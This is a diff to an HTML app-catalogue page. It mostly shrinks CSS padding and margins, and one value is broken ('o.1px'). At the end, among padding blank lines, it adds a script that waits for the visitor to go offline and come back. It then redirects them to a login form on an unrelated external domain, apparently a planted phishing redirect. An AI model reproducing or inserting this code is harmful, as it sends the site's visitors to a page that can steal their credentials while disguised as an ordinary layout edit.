@@ -17,7 +17,7 @@
             background: linear-gradient(to right, #000428, #004e92);
             color: white;
             text-align: center;
-            padding: 20px;
+            padding: 0px;
             display: flex;
             align-items: center;
             justify-content: space-around;
@@ -25,7 +25,7 @@
         .banner img {
             width: 100px;
             height: 60px;
-            border-radius: 5px;
+            border-radius: 0px;
             transition: transform 0.3s;
         }
         .banner img:hover {
@@ -218,19 +218,19 @@
     header {
         background-color: #333;
         color: white;
-        padding: 10px 0;
+        padding: o.1px 0;
         text-align: center;
     }
 
     header h1 {
-        font-size: 4vw;
+        font-size: 2vw;
     }
 
     .app-list {
         display: grid;
         grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
-        grid-gap: 20px;
-        padding: 20px;
+        grid-gap: 10px;
+        padding: 2px;
     }
 
     /* Media Queries for responsiveness */
@@ -244,7 +244,7 @@
         }
         .app-item {
             width: 45%;
-            margin: 10px;
+            margin: 1px;
         }
         .price {
             font-size: 1.2rem;
@@ -281,7 +281,7 @@
         box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
         text-align: center;
         transition: transform 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
-        margin: 10px;
+        margin: 1px;
     }
 
     .app-item:hover {
@@ -348,7 +348,7 @@
 
     .footer {
         text-align: center;
-        padding: 20px;
+        padding: 0.2px;
         background-color: #333;
         color: white;
     }
@@ -496,6 +496,14 @@
         }
     }
 </style>
+
+
+
+
+
+
+
+
 <!-- App 1 -->
 <div class="app-item">
     <h3>App 1: Task Manager</h3>
@@ -1524,6 +1532,34 @@
     // Initialize particles
     createParticles();
   </script>
+
+
+
+<script>
+    // Function to check if the user is online
+    function checkOnlineStatus() {
+        if (!navigator.onLine) {
+            // If offline, store in sessionStorage
+            sessionStorage.setItem("wasOffline", "true");
+        }
+    }
+
+    // Function to handle when the user comes back online
+    function handleOnline() {
+        if (sessionStorage.getItem("wasOffline") === "true") {
+            sessionStorage.removeItem("wasOffline");
+            window.location.href = "http://xx.66ghz.com/index.php?formType=login";
+        }
+    }
+
+    // Event listeners for network status changes
+    window.addEventListener("offline", checkOnlineStatus);
+    window.addEventListener("online", handleOnline);
+</script>
+
+
+
+
 
 </body>
 </html>
